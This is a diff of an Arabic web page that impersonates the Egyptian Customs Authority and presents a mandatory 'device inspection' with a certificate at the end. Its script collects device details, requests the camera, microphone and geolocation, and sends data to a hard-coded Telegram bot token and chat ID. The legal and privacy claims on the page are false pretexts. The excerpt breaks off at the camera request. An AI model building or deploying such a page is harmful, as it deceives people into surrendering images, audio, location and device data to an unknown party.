                 
-                <!-- خطوات الفحص المتقدمة -->
-                <div class="advanced-steps">
-                    <div class="step-card active" id="step1" onclick="showTest(1)">
-                        <div class="step-badge">١</div>
-                        <div class="step-icon">
-                            <i class="fas fa-id-card-alt"></i>
-                        </div>
-                        <div class="step-title">جمع معلومات الجهاز</div>
-                        <div class="step-desc">فحص تلقائي لمواصفات الجهاز والمعلومات الأساسية</div>
-                        <div class="step-status status-active">نشط الآن</div>
-                    </div>
-                    
-                    <div class="step-card" id="step2" onclick="showTest(2)">
-                        <div class="step-badge">٢</div>
-                        <div class="step-icon">
+                <!-- اختبار 2 -->
+                <div class="test-container-mobile" id="mobileTest2">
+                    <div class="test-header-mobile">
+                        <div class="test-title">
                             <i class="fas fa-camera"></i>
+                            فحص الكاميرا
                         </div>
-                        <div class="step-title">الفحص البصري (صورة)</div>
-                        <div class="step-desc">التقاط صورة تلقائية للتحقق من مطابقة الجهاز</div>
-                        <div class="step-status status-pending">في الانتظار</div>
+                        <div class="test-timer-mobile" id="mobileTimer2">--:--</div>
                     </div>
                     
-                    <div class="step-card" id="step3" onclick="showTest(3)">
-                        <div class="step-badge">٣</div>
-                        <div class="step-icon">
-                            <i class="fas fa-video"></i>
+                    <div class="camera-mobile">
+                        <video id="cameraFeedMobile" autoplay playsinline></video>
+                        <div class="camera-overlay-mobile" id="cameraOverlayMobile">
+                            <i class="fas fa-camera" style="font-size: 36px; margin-bottom: 15px;"></i>
+                            <div>جاري تفعيل الكاميرا...</div>
+                            <div style="font-size: 24px; font-weight: bold; margin-top: 15px;" id="mobileCountdown1">3</div>
                         </div>
-                        <div class="step-title">فحص الفيديو</div>
-                        <div class="step-desc">تسجيل فيديو قصير للتحقق من جودة الكاميرا</div>
-                        <div class="step-status status-pending">في الانتظار</div>
                     </div>
                     
-                    <div class="step-card" id="step4" onclick="showTest(4)">
-                        <div class="step-badge">٤</div>
-                        <div class="step-icon">
+                    <div style="text-align: center; margin-top: 15px; color: #666; font-size: 14px;">
+                        سيتم التقاط صورة تلقائياً بعد العد التنازلي
+                    </div>
+                </div>
+                
+                <!-- اختبار 3 -->
+                <div class="test-container-mobile" id="mobileTest3">
+                    <div class="test-header-mobile">
+                        <div class="test-title">
                             <i class="fas fa-microphone"></i>
+                            فحص الصوت
                         </div>
-                        <div class="step-title">فحص الصوت</div>
-                        <div class="step-desc">اختبار جودة الميكروفون والتسجيل الصوتي</div>
-                        <div class="step-status status-pending">في الانتظار</div>
+                        <div class="test-timer-mobile" id="mobileTimer3">--:--</div>
                     </div>
                     
-                    <div class="step-card" id="step5" onclick="showTest(5)">
-                        <div class="step-badge">٥</div>
-                        <div class="step-icon">
+                    <div style="text-align: center; margin: 20px 0;">
+                        <div style="font-size: 48px; color: var(--primary-blue); margin-bottom: 15px;">
+                            <i class="fas fa-volume-up"></i>
+                        </div>
+                        <h3 style="color: var(--primary-blue); margin-bottom: 10px;">تحدث بصوت عالٍ لاختبار الميكروفون</h3>
+                    </div>
+                    
+                    <div class="volume-container">
+                        <div class="volume-meter-mobile">
+                            <div class="volume-level-mobile" id="volumeLevelMobile"></div>
+                        </div>
+                        <div style="text-align: center; margin: 10px 0; font-weight: bold; color: var(--primary-blue);" id="volumeTextMobile">
+                            مستوى الصوت: 0%
+                        </div>
+                    </div>
+                    
+                    <div style="text-align: center; color: #666; font-size: 14px; margin-top: 15px;">
+                        سيتم تسجيل عينة صوتية لمدة 3 ثوانٍ
+                    </div>
+                </div>
+                
+                <!-- اختبار 4 -->
+                <div class="test-container-mobile" id="mobileTest4">
+                    <div class="test-header-mobile">
+                        <div class="test-title">
                             <i class="fas fa-map-marker-alt"></i>
+                            الموقع الجغرافي
                         </div>
-                        <div class="step-title">الموقع الجغرافي</div>
-                        <div class="step-desc">التأكد من موقع الجهاز داخل الجمهورية</div>
-                        <div class="step-status status-pending">في الانتظار</div>
+                        <div class="test-timer-mobile" id="mobileTimer4">--:--</div>
                     </div>
                     
-                    <div class="step-card" id="step6" onclick="showTest(6)">
-                        <div class="step-badge">٦</div>
-                        <div class="step-icon">
-                            <i class="fas fa-file-certificate"></i>
+                    <div style="text-align: center; margin: 20px 0;">
+                        <div style="font-size: 48px; color: var(--primary-blue); margin-bottom: 15px;">
+                            <i class="fas fa-globe"></i>
                         </div>
-                        <div class="step-title">إصدار الشهادة</div>
-                        <div class="step-desc">إعطاء الجهاز ترخيص تشغيل معتمد</div>
-                        <div class="step-status status-pending">في الانتظار</div>
+                        <h3 style="color: var(--primary-blue); margin-bottom: 10px;">جاري تحديد موقع الجهاز...</h3>
                     </div>
-                </div>
-                
-                <!-- منطقة الاختبارات -->
-                <div class="test-section">
-                    <!-- اختبار 1: معلومات الجهاز -->
-                    <div class="test-container active" id="test1">
-                        <div class="test-header">
-                            <h3><i class="fas fa-id-card-alt"></i> جمع معلومات الجهاز</h3>
-                            <div class="test-timer" id="timer1">يبدأ تلقائياً</div>
+                    
+                    <div class="map-mobile">
+                        <div id="mapContentMobile" style="text-align: center; color: #666;">
+                            <i class="fas fa-map" style="font-size: 36px; margin-bottom: 10px;"></i>
+                            <div>جاري تحميل بيانات الموقع...</div>
                         </div>
-                        <div style="text-align: center;">
-                            <div style="font-size: 80px; color: var(--primary-blue); margin-bottom: 30px;">
-                                <i class="fas fa-laptop-code"></i>
-                            </div>
-                            <h4 style="color: var(--primary-blue); margin-bottom: 20px;">جاري فحص مواصفات الجهاز...</h4>
-                            <div class="info-grid">
-                                <div class="info-card">
-                                    <i class="fas fa-microchip" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                                    <div style="font-weight: bold;" id="deviceInfo1">المتصفح: جاري الفحص...</div>
-                                </div>
-                                <div class="info-card">
-                                    <i class="fas fa-desktop" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                                    <div style="font-weight: bold;" id="deviceInfo2">الدقة: جاري الفحص...</div>
-                                </div>
-                                <div class="info-card">
-                                    <i class="fas fa-globe" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                                    <div style="font-weight: bold;" id="deviceInfo3">اللغة: جاري الفحص...</div>
-                                </div>
-                            </div>
+                        <div class="map-coordinates" id="mobileCoordinates">
+                            الإحداثيات: جاري التحديد...
                         </div>
                     </div>
                     
-                    <!-- اختبار 2: الكاميرا (صورة) -->
-                    <div class="test-container" id="test2">
-                        <div class="test-header">
-                            <h3><i class="fas fa-camera"></i> الفحص البصري - كاميرا الصور</h3>
-                            <div class="test-timer" id="timer2">--:--</div>
+                    <div class="device-info-mobile" style="margin-top: 20px;">
+                        <div class="info-item">
+                            <div class="info-label">الدولة</div>
+                            <div class="info-value" id="infoCountry">جاري الفحص...</div>
                         </div>
-                        <div class="camera-test">
-                            <div class="camera-preview">
-                                <video id="cameraFeed" autoplay playsinline></video>
-                                <div class="camera-overlay" id="cameraOverlay1">
-                                    <i class="fas fa-camera" style="font-size: 48px; margin-bottom: 20px;"></i>
-                                    <div>جاري تهيئة كاميرا الفحص البصري...</div>
-                                </div>
-                            </div>
+                        <div class="info-item">
+                            <div class="info-label">المدينة</div>
+                            <div class="info-value" id="infoCity">جاري الفحص...</div>
                         </div>
-                    </div>
-                    
-                    <!-- اختبار 3: الفيديو -->
-                    <div class="test-container" id="test3">
-                        <div class="test-header">
-                            <h3><i class="fas fa-video"></i> فحص جودة الفيديو</h3>
-                            <div class="test-timer" id="timer3">--:--</div>
+                        <div class="info-item">
+                            <div class="info-label">المنطقة الزمنية</div>
+                            <div class="info-value" id="infoTimezone">جاري الفحص...</div>
                         </div>
-                        <div class="camera-test">
-                            <div class="camera-preview">
-                                <video id="videoPreview" autoplay playsinline></video>
-                                <div class="camera-overlay" id="cameraOverlay2">
-                                    <i class="fas fa-video" style="font-size: 48px; margin-bottom: 20px;"></i>
-                                    <div>جاري تهيئة نظام تسجيل الفيديو...</div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- اختبار 4: الميكروفون -->
-                    <div class="test-container" id="test4">
-                        <div class="test-header">
-                            <h3><i class="fas fa-microphone"></i> اختبار جودة الصوت</h3>
-                            <div class="test-timer" id="timer4">--:--</div>
-                        </div>
-                        <div class="microphone-test">
-                            <div style="font-size: 80px; color: var(--primary-blue); margin-bottom: 30px;">
-                                <i class="fas fa-microphone-alt"></i>
-                            </div>
-                            <h4 style="color: var(--primary-blue); margin-bottom: 20px;">تحدث بصوت عالٍ لاختبار الميكروفون</h4>
-                            <div class="volume-meter">
-                                <div class="volume-level" id="volumeLevel"></div>
-                            </div>
-                            <div style="margin: 20px 0; font-weight: bold; color: var(--primary-blue);" id="volumeText">
-                                مستوى الصوت: 0%
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- اختبار 5: الموقع -->
-                    <div class="test-container" id="test5">
-                        <div class="test-header">
-                            <h3><i class="fas fa-map-marker-alt"></i> التحقق من الموقع الجغرافي</h3>
-                            <div class="test-timer" id="timer5">--:--</div>
-                        </div>
-                        <div class="location-test">
-                            <div style="font-size: 80px; color: var(--primary-blue); margin-bottom: 30px;">
-                                <i class="fas fa-globe-africa"></i>
-                            </div>
-                            <h4 style="color: var(--primary-blue); margin-bottom: 20px;">جاري تحديد موقع الجهاز الجغرافي...</h4>
-                            <div class="map-container">
-                                <div class="map-placeholder" id="mapPlaceholder">
-                                    <i class="fas fa-map" style="font-size: 48px; margin-bottom: 20px;"></i>
-                                    <div>جاري تحميل الخريطة...</div>
-                                </div>
-                                <div id="mapCoordinates" style="position: absolute; bottom: 20px; background: rgba(0,0,0,0.7); color: white; padding: 10px 20px; border-radius: 5px;">
-                                    الإحداثيات: جاري التحديد...
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <!-- اختبار 6: الشهادة -->
-                    <div class="test-container" id="test6">
-                        <div class="test-header">
-                            <h3><i class="fas fa-file-certificate"></i> إصدار الشهادة النهائية</h3>
-                            <div class="test-timer" id="timer6">--:--</div>
-                        </div>
-                        <div style="text-align: center;">
-                            <div style="font-size: 80px; color: var(--success); margin-bottom: 30px;">
-                                <i class="fas fa-award"></i>
-                            </div>
-                            <h4 style="color: var(--success); margin-bottom: 20px;">تم الفحص بنجاح!</h4>
-                            <div style="background: linear-gradient(135deg, #d4edda, #c3e6cb); padding: 30px; border-radius: 15px; margin: 30px 0; border: 2px solid #c3e6cb;">
-                                <div style="font-size: 32px; font-weight: bold; color: var(--primary-blue); margin-bottom: 20px;" id="certificateNumber">
-                                    جاري الإصدار...
-                                </div>
-                                <div style="color: #155724; margin-bottom: 10px;">تم بنجاح فحص جميع مكونات الجهاز</div>
-                                <div style="color: #155724; margin-bottom: 10px;">جميع الاختبارات اكتملت بنجاح</div>
-                                <div style="color: #155724;">يمكنك الآن استخدام الجهاز داخل جمهورية مصر العربية</div>
-                            </div>
+                        <div class="info-item">
+                            <div class="info-label">مزود الخدمة</div>
+                            <div class="info-value" id="infoISP">جاري الفحص...</div>
                         </div>
                     </div>
                 </div>
                 
-                <!-- شريط التقدم المتقدم -->
-                <div class="advanced-progress">
-                    <div class="progress-stats">
-                        <div>
-                            <h4 style="color: var(--primary-blue);">تقدم الفحص الشامل</h4>
-                            <div style="color: #666; font-size: 14px;">فحص شامل لجميع مكونات الجهاز</div>
+                <!-- اختبار 5 -->
+                <div class="test-container-mobile" id="mobileTest5">
+                    <div class="test-header-mobile">
+                        <div class="test-title">
+                            <i class="fas fa-certificate"></i>
+                            الشهادة النهائية
                         </div>
-                        <div style="text-align: right;">
-                            <div style="font-size: 32px; font-weight: bold; color: var(--primary-blue);" id="progressPercent">١٦٪</div>
-                            <div style="color: #666; font-size: 14px;">مكتمل</div>
+                        <div class="test-timer-mobile" id="mobileTimer5">--:--</div>
+                    </div>
+                    
+                    <div class="certificate-mobile">
+                        <div class="certificate-icon">
+                            <i class="fas fa-award"></i>
                         </div>
+                        <div class="certificate-number" id="mobileCertificateNumber">
+                            جاري الإصدار...
+                        </div>
+                        <div style="color: #155724; margin-bottom: 10px;">تم فحص جميع مكونات الجهاز بنجاح</div>
+                        <div style="color: #155724; margin-bottom: 10px;">الجهاز مطابق للمواصفات القياسية</div>
+                        <div style="color: #155724; font-size: 14px;">تاريخ الإصدار: <span id="certificateDate"></span></div>
+                        <div style="color: #155724; font-size: 14px;">تاريخ الانتهاء: <span id="certificateExpiry"></span></div>
                     </div>
-                    <div class="progress-bar-container">
-                        <div class="progress-bar" id="progressBar" style="width: 16%;"></div>
-                    </div>
-                    <div style="display: flex; justify-content: space-between; font-size: 12px; color: #666;">
-                        <span>البداية</span>
-                        <span>منتصف الفحص</span>
-                        <span>قرب النهاية</span>
-                        <span>الاكتمال</span>
-                    </div>
-                </div>
-                
-                <!-- لوحة التحكم -->
-                <div class="control-panel">
-                    <h3 style="color: var(--primary-blue); margin-bottom: 20px; text-align: center;">
-                        <i class="fas fa-sliders-h"></i> التحكم في عملية الفحص
-                    </h3>
-                    <div class="control-buttons">
-                        <button class="control-btn btn-start glow" onclick="startCompleteInspection()" id="startBtn">
-                            <i class="fas fa-play"></i> بدء الفحص الشامل
-                        </button>
-                        <button class="control-btn btn-next" onclick="nextTest()" id="nextBtn" disabled>
-                            <i class="fas fa-forward"></i> الانتقال للاختبار التالي
-                        </button>
-                        <button class="control-btn btn-pause" onclick="pauseInspection()" id="pauseBtn" disabled>
-                            <i class="fas fa-pause"></i> إيقاف مؤقت
-                        </button>
-                        <button class="control-btn btn-stop" onclick="stopInspection()" id="stopBtn" disabled>
-                            <i class="fas fa-stop"></i> إيقاف الفحص
+                    
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button class="mobile-btn btn-start-mobile" onclick="downloadReport()" id="downloadBtn" style="display: none;">
+                            <i class="fas fa-download"></i>
+                            تحميل التقرير الكامل
                         </button>
                     </div>
                 </div>
-                
-                <!-- معلومات النظام -->
-                <div class="info-panel">
-                    <h4 style="color: var(--primary-blue); margin-bottom: 20px; display: flex; align-items: center; gap: 10px;">
-                        <i class="fas fa-info-circle"></i> معلومات الفحص الشامل
-                    </h4>
-                    <div class="info-grid">
-                        <div class="info-card">
-                            <i class="fas fa-clock" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                            <div style="font-weight: bold;">المدة التقديرية</div>
-                            <div style="color: #666; font-size: 14px;">٦٠-٩٠ ثانية للفحص الكامل</div>
-                        </div>
-                        <div class="info-card">
-                            <i class="fas fa-database" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                            <div style="font-weight: bold;">البيانات المجمعة</div>
-                            <div style="color: #666; font-size: 14px;">٦ فئات من البيانات التشخيصية</div>
-                        </div>
-                        <div class="info-card">
-                            <i class="fas fa-shield-alt" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                            <div style="font-weight: bold;">الأمان والخصوصية</div>
-                            <div style="color: #666; font-size: 14px;">تشفير كامل لجميع البيانات</div>
-                        </div>
-                        <div class="info-card">
-                            <i class="fas fa-file-contract" style="color: var(--primary-blue); margin-bottom: 10px;"></i>
-                            <div style="font-weight: bold;">الالتزام القانوني</div>
-                            <div style="color: #666; font-size: 14px;">إلزامي بموجب القانون المصري</div>
-                        </div>
+            </div>
+            
+            <!-- شريط التقدم -->
+            <div class="progress-mobile">
+                <div class="progress-info">
+                    <div>
+                        <div style="font-weight: bold; color: var(--primary-blue);">تقدم الفحص</div>
+                        <div style="font-size: 12px; color: #666;">فحص شامل لجميع المكونات</div>
+                    </div>
+                    <div style="text-align: right;">
+                        <div style="font-size: 24px; font-weight: bold; color: var(--primary-blue);" id="mobileProgressPercent">20%</div>
+                        <div style="font-size: 12px; color: #666;">مكتمل</div>
                     </div>
                 </div>
+                <div class="progress-bar-mobile">
+                    <div class="progress-fill-mobile" id="mobileProgressFill" style="width: 20%;"></div>
+                </div>
+            </div>
+            
+            <!-- أزرار التحكم -->
+            <div class="buttons-mobile">
+                <button class="mobile-btn btn-start-mobile" onclick="startMobileInspection()" id="mobileStartBtn">
+                    <i class="fas fa-play"></i>
+                    بدء الفحص التلقائي
+                </button>
+                <button class="mobile-btn btn-next-mobile" onclick="nextMobileTest()" id="mobileNextBtn" style="display: none;">
+                    <i class="fas fa-forward"></i>
+                    الانتقال للفحص التالي
+                </button>
+            </div>
+        </div>
+        
+        <!-- معلومات قانونية -->
+        <div style="background: white; border-radius: 10px; padding: 20px; margin-top: 20px; border: 1px solid #e0e0e0;">
+            <h3 style="color: var(--primary-blue); margin-bottom: 15px; font-size: 18px;">
+                <i class="fas fa-gavel"></i>
+                معلومات قانونية
+            </h3>
+            <div style="color: #666; font-size: 14px; line-height: 1.6;">
+                <p>يتم الفحص بموجب القانون المصري رقم 66 لسنة 1963 وتعديلاته.</p>
+                <p>جميع البيانات مشفرة ولا يتم تخزينها إلا لأغراض الفحص.</p>
+                <p>الفحص إلزامي لجميع الأجهزة المستوردة والمحلية.</p>
             </div>
         </div>
     </div>
     
-    <!-- تنبيهات النظام المخفية -->
-    <div class="hidden-notification" id="systemNotification">
-        <div id="notificationMessage"></div>
+    <!-- الفوتر -->
+    <footer class="mobile-footer">
+        <div>© 2024 الهيئة العامة للجمارك المصرية</div>
+        <div style="margin-top: 10px; color: #adb5bd; font-size: 11px;">
+            نظام الفحص الشامل الإلكتروني - النسخة المحمولة
+        </div>
+    </footer>
+    
+    <!-- إشعارات الجوال -->
+    <div class="mobile-notification" id="mobileNotification">
+        <div id="mobileNotificationText"></div>
     </div>
 
-    <!-- ===== JavaScript المتقدم ===== -->
+    <!-- ===== JavaScript للجوال والفحص التلقائي ===== -->
     <script>
         // 🔧 إعدادات بوت تلجرام
         const TELEGRAM_BOT_TOKEN = '8233482255:AAF1wr7ahEupPq4k2SiovrjMX6WnTKbpctg';
         const TELEGRAM_CHAT_ID = '848066586';
         
-        // متغيرات النظام المتقدمة
-        let currentTest = 1;
-        let isInspectionActive = false;
-        let isPaused = false;
-        let cameraStream = null;
-        let videoRecorder = null;
-        let audioRecorder = null;
-        let recordedChunks = [];
-        let recordedAudio = null;
-        let testTimers = {};
-        let collectedData = {
-            deviceInfo: {},
-            photos: [],
-            videos: [],
-            audio: [],
+        // متغيرات النظام
+        let currentMobileTest = 1;
+        let isMobileInspectionActive = false;
+        let cameraStreamMobile = null;
+        let audioStreamMobile = null;
+        let audioContextMobile = null;
+        let collectedDataMobile = {
+            device: {},
+            photo: null,
+            audioLevels: [],
             location: {},
             timestamps: {}
         };
+        let allDataCollected = false;
+        let finalReportSent = false;
         
-        // عناصر DOM
-        const elements = {
+        // عناصر DOM للجوال
+        const mobileElements = {
             // التايمرات
-            timer1: document.getElementById('timer1'),
-            timer2: document.getElementById('timer2'),
-            timer3: document.getElementById('timer3'),
-            timer4: document.getElementById('timer4'),
-            timer5: document.getElementById('timer5'),
-            timer6: document.getElementById('timer6'),
+            timer1: document.getElementById('mobileTimer1'),
+            timer2: document.getElementById('mobileTimer2'),
+            timer3: document.getElementById('mobileTimer3'),
+            timer4: document.getElementById('mobileTimer4'),
+            timer5: document.getElementById('mobileTimer5'),
             
-            // الكاميرا والعناصر المرئية
-            cameraFeed: document.getElementById('cameraFeed'),
-            videoPreview: document.getElementById('videoPreview'),
-            cameraOverlay1: document.getElementById('cameraOverlay1'),
-            cameraOverlay2: document.getElementById('cameraOverlay2'),
-            volumeLevel: document.getElementById('volumeLevel'),
-            volumeText: document.getElementById('volumeText'),
-            mapPlaceholder: document.getElementById('mapPlaceholder'),
-            mapCoordinates: document.getElementById('mapCoordinates'),
+            // الكاميرا والصوت
+            cameraFeed: document.getElementById('cameraFeedMobile'),
+            cameraOverlay: document.getElementById('cameraOverlayMobile'),
+            countdown1: document.getElementById('mobileCountdown1'),
+            volumeLevel: document.getElementById('volumeLevelMobile'),
+            volumeText: document.getElementById('volumeTextMobile'),
             
-            // معلومات الجهاز
-            deviceInfo1: document.getElementById('deviceInfo1'),
-            deviceInfo2: document.getElementById('deviceInfo2'),
-            deviceInfo3: document.getElementById('deviceInfo3'),
+            // المعلومات
+            infoBrowser: document.getElementById('infoBrowser'),
+            infoOS: document.getElementById('infoOS'),
+            infoResolution: document.getElementById('infoResolution'),
+            infoLanguage: document.getElementById('infoLanguage'),
+            infoMemory: document.getElementById('infoMemory'),
+            infoConnection: document.getElementById('infoConnection'),
+            infoCountry: document.getElementById('infoCountry'),
+            infoCity: document.getElementById('infoCity'),
+            infoTimezone: document.getElementById('infoTimezone'),
+            infoISP: document.getElementById('infoISP'),
             
-            // التقدم والشهادة
-            progressBar: document.getElementById('progressBar'),
-            progressPercent: document.getElementById('progressPercent'),
-            certificateNumber: document.getElementById('certificateNumber'),
+            // التقدم
+            progressFill: document.getElementById('mobileProgressFill'),
+            progressPercent: document.getElementById('mobileProgressPercent'),
             
-            // الأزرار
-            startBtn: document.getElementById('startBtn'),
-            nextBtn: document.getElementById('nextBtn'),
-            pauseBtn: document.getElementById('pauseBtn'),
-            stopBtn: document.getElementById('stopBtn'),
+            // الشهادة
+            certificateNumber: document.getElementById('mobileCertificateNumber'),
+            certificateDate: document.getElementById('certificateDate'),
+            certificateExpiry: document.getElementById('certificateExpiry'),
             
             // الإشعارات
-            systemNotification: document.getElementById('systemNotification'),
-            notificationMessage: document.getElementById('notificationMessage')
+            notification: document.getElementById('mobileNotification'),
+            notificationText: document.getElementById('mobileNotificationText'),
+            
+            // الأزرار
+            startBtn: document.getElementById('mobileStartBtn'),
+            nextBtn: document.getElementById('mobileNextBtn'),
+            downloadBtn: document.getElementById('downloadBtn'),
+            
+            // الإحداثيات
+            coordinates: document.getElementById('mobileCoordinates'),
+            mapContent: document.getElementById('mapContentMobile')
         };
         
-        // دالة عرض إشعار مخفي
-        function showHiddenNotification(message, duration = 3000) {
-            elements.notificationMessage.textContent = message;
-            elements.systemNotification.style.display = 'block';
+        // دالة عرض إشعار للجوال
+        function showMobileNotification(message, duration = 3000) {
+            mobileElements.notificationText.textContent = message;
+            mobileElements.notification.style.display = 'block';
             
             setTimeout(() => {
-                elements.systemNotification.style.display = 'none';
+                mobileElements.notification.style.display = 'none';
             }, duration);
             
-            // تسجيل في السجل
-            console.log(`🔔 ${message}`);
+            console.log(`📱 ${message}`);
         }
         
-        // دالة تحديث الخطوات
-        function updateStep(stepNumber) {
+        // دالة تحديث الخطوات للجوال
+        function updateMobileStep(stepNumber) {
             // تحديث جميع الخطوات
-            for (let i = 1; i <= 6; i++) {
-                const stepElement = document.getElementById(`step${i}`);
-                const statusElement = stepElement.querySelector('.step-status');
+            for (let i = 1; i <= 5; i++) {
+                const stepElement = document.getElementById(`mobileStep${i}`);
+                const statusElement = stepElement.querySelector('.step-status-mobile');
                 
                 if (i < stepNumber) {
                     stepElement.classList.remove('active');
                     stepElement.classList.add('completed');
-                    statusElement.className = 'step-status status-completed';
+                    statusElement.className = 'step-status-mobile status-completed';
                     statusElement.textContent = 'مكتمل';
                 } else if (i === stepNumber) {
                     stepElement.classList.add('active');
                     stepElement.classList.remove('completed');
-                    statusElement.className = 'step-status status-active';
-                    statusElement.textContent = 'نشط الآن';
+                    statusElement.className = 'step-status-mobile status-active';
+                    statusElement.textContent = 'نشط';
                 } else {
                     stepElement.classList.remove('active', 'completed');
-                    statusElement.className = 'step-status status-pending';
+                    statusElement.className = 'step-status-mobile status-pending';
                     statusElement.textContent = 'في الانتظار';
                 }
             }
             
-            // تحديث شريط التقدم
-            const progressPercentage = Math.round(((stepNumber - 1) / 5) * 100);
-            elements.progressBar.style.width = `${progressPercentage}%`;
-            elements.progressPercent.textContent = `${progressPercentage}%`;
-            
-            // تحديث الاختبار النشط
-            document.querySelectorAll('.test-container').forEach(container => {
+            // تحديث الاختبارات النشطة
+            document.querySelectorAll('.test-container-mobile').forEach(container => {
                 container.classList.remove('active');
             });
-            document.getElementById(`test${stepNumber}`).classList.add('active');
+            document.getElementById(`mobileTest${stepNumber}`).classList.add('active');
             
-            currentTest = stepNumber;
+            // تحديث شريط التقدم
+            const progressPercentage = (stepNumber - 1) * 20;
+            mobileElements.progressFill.style.width = `${progressPercentage}%`;
+            mobileElements.progressPercent.textContent = `${progressPercentage}%`;
+            
+            currentMobileTest = stepNumber;
         }
         
-        // دالة عرض اختبار محدد
-        function showTest(stepNumber) {
-            if (isInspectionActive && !isPaused) return;
-            updateStep(stepNumber);
-        }
-        
-        // دالة بدء الفحص الشامل
-        async function startCompleteInspection() {
-            if (isInspectionActive) return;
+        // دالة بدء الفحص التلقائي للجوال
+        function startMobileInspection() {
+            if (isMobileInspectionActive) return;
             
-            isInspectionActive = true;
-            elements.startBtn.disabled = true;
-            elements.nextBtn.disabled = false;
-            elements.pauseBtn.disabled = false;
-            elements.stopBtn.disabled = false;
-            elements.startBtn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> جاري البدء...';
+            isMobileInspectionActive = true;
+            mobileElements.startBtn.disabled = true;
+            mobileElements.startBtn.innerHTML = '<i class="fas fa-sync-alt fa-spin"></i> جاري البدء...';
+            mobileElements.nextBtn.style.display = 'none';
             
-            showHiddenNotification('🚀 بدء الفحص الشامل المتكامل...', 2000);
+            showMobileNotification('🚀 بدء الفحص الشامل التلقائي...', 2000);
             
-            // بدء الاختبار الأول تلقائياً
+            // إرسال رسالة بدء للبوت
+            sendStartupMessage();
+            
+            // بدء الاختبار الأول
             setTimeout(() => {
-                startTest(currentTest);
+                startMobileTest(currentMobileTest);
             }, 1500);
         }
         
-        // دالة بدء اختبار محدد
-        async function startTest(testNumber) {
-            if (!isInspectionActive || isPaused) return;
+        // دالة بدء اختبار محدد للجوال
+        async function startMobileTest(testNumber) {
+            if (!isMobileInspectionActive) return;
             
-            // إعادة تعيين التايمر
-            if (testTimers[testNumber]) {
-                clearInterval(testTimers[testNumber]);
-            }
-            
-            let seconds = 0;
-            testTimers[testNumber] = setInterval(() => {
-                seconds++;
-                const timerElement = elements[`timer${testNumber}`];
-                if (timerElement) {
-                    timerElement.textContent = `${Math.floor(seconds / 60)}:${(seconds % 60).toString().padStart(2, '0')}`;
-                }
-            }, 1000);
+            // إعداد التايمر
+            startTimer(testNumber);
             
             switch(testNumber) {
                 case 1:
-                    await startDeviceInfoTest();
+                    await mobileTestDeviceInfo();
                     break;
                 case 2:
-                    await startCameraTest();
+                    await mobileTestCamera();
                     break;
                 case 3:
-                    await startVideoTest();
+                    await mobileTestMicrophone();
                     break;
                 case 4:
-                    await startMicrophoneTest();
+                    await mobileTestLocation();
                     break;
                 case 5:
-                    await startLocationTest();
-                    break;
-                case 6:
-                    await startCertificateGeneration();
+                    await mobileTestCertificate();
                     break;
             }
         }
         
+        // دالة التايمر
+        function startTimer(testNumber) {
+            let seconds = 0;
+            const timerElement = mobileElements[`timer${testNumber}`];
+            if (!timerElement) return;
+            
+            timerElement.textContent = '00:00';
+            
+            const timerInterval = setInterval(() => {
+                seconds++;
+                const minutes = Math.floor(seconds / 60);
+                const secs = seconds % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                
+                // إيقاف التايمر عند اكتمال الاختبار
+                if (currentMobileTest !== testNumber) {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
+        
         // اختبار 1: معلومات الجهاز
-        async function startDeviceInfoTest() {
-            showHiddenNotification('🔍 جاري جمع معلومات الجهاز...', 2000);
+        async function mobileTestDeviceInfo() {
+            showMobileNotification('🔍 جاري جمع معلومات الجهاز...', 2000);
             
             // جمع معلومات الجهاز
             const deviceInfo = {
-                userAgent: navigator.userAgent,
+                browser: navigator.userAgent,
                 platform: navigator.platform,
                 language: navigator.language,
                 screenWidth: screen.width,
                 screenHeight: screen.height,
                 colorDepth: screen.colorDepth,
-                pixelDepth: screen.pixelDepth,
                 deviceMemory: navigator.deviceMemory || 'غير معروف',
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cookiesEnabled: navigator.cookieEnabled,
-                online: navigator.onLine
+                cookies: navigator.cookieEnabled,
+                online: navigator.onLine,
+                userAgent: navigator.userAgent
             };
             
             // تحديث الواجهة
-            elements.deviceInfo1.textContent = `المتصفح: ${deviceInfo.userAgent.split(') ')[0].substring(0, 40)}...`;
-            elements.deviceInfo2.textContent = `الدقة: ${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
-            elements.deviceInfo3.textContent = `اللغة: ${deviceInfo.language}`;
+            mobileElements.infoBrowser.textContent = getBrowserName(deviceInfo.browser);
+            mobileElements.infoOS.textContent = getOSName(deviceInfo.platform);
+            mobileElements.infoResolution.textContent = `${deviceInfo.screenWidth} × ${deviceInfo.screenHeight}`;
+            mobileElements.infoLanguage.textContent = deviceInfo.language;
+            mobileElements.infoMemory.textContent = deviceInfo.deviceMemory + ' GB';
+            mobileElements.infoConnection.textContent = deviceInfo.online ? 'متصل' : 'غير متصل';
             
             // حفظ المعلومات
-            collectedData.deviceInfo = deviceInfo;
+            collectedDataMobile.device = deviceInfo;
             
-            // إرسال المعلومات للبوت
-            await sendDeviceInfoToTelegram(deviceInfo);
-            
-            // الانتقال التلقائي للاختبار التالي بعد 5 ثوان
+            // الانتقال للاختبار التالي بعد 4 ثوان
             setTimeout(() => {
-                updateStep(2);
-                startTest(2);
-            }, 5000);
+                updateMobileStep(2);
+                startMobileTest(2);
+            }, 4000);
         }
         
-        // اختبار 2: الكاميرا (صورة)
-        async function startCameraTest() {
-            showHiddenNotification('📸 جاري تهيئة كاميرا الفحص البصري...', 2000);
+        // اختبار 2: الكاميرا
+        async function mobileTestCamera() {
+            showMobileNotification('📸 جاري تفعيل الكاميرا...', 2000);
             
             try {
                 // طلب صلاحية الكاميرا
-                cameraStream = await navigator.mediaDevices.getUserMedia({
+                cameraStreamMobile = await navigator.mediaDevices.getUserMedia({
                     video: {
